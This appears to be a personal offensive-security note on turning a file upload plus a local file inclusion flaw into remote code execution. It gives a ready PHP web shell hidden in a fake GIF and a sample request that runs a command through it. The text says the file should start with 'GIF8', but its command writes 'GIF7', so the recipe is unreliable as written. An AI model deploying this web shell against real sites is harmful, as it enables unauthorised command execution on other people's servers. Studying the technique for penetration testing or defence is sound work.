For LFI to work in file uploads, the file upload form do not need to be vulnerable, but merely allow us to upload files. If the vulnerable function has code `Execute` [capabilities](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FServer-side%20Vulnerabilities%2FFile%20Inclusion%20Vulnerabilities%2FRead%20vs%20Execute), then the code within the file we upload will get executed if we include it, regardless of the file extension or file type.

For example, we can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
## Crafting Malicious Image
The first step is to create a malicious image file containing a shell code that still looks and works as an image. The file should still include the image magic bytes at the beginning of the file content (i.e `GIF8`), just in case the upload form checks for both the extension and content type as well. For example:
```bash
echo 'GIF7<?php system($_GET["cmd"]) ?>' > shell.gif
```
This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.

Once the malicious file has been uploaded, all we need to do is include it through the LFI vulnerability. To do this, we need to know the path of the uploaded file. In most cases, especially with images, we can get its path from inspecting the source code after uploading the image.
```txt
http://target-website.com/?language=./images/shell.gif&cmd=id
```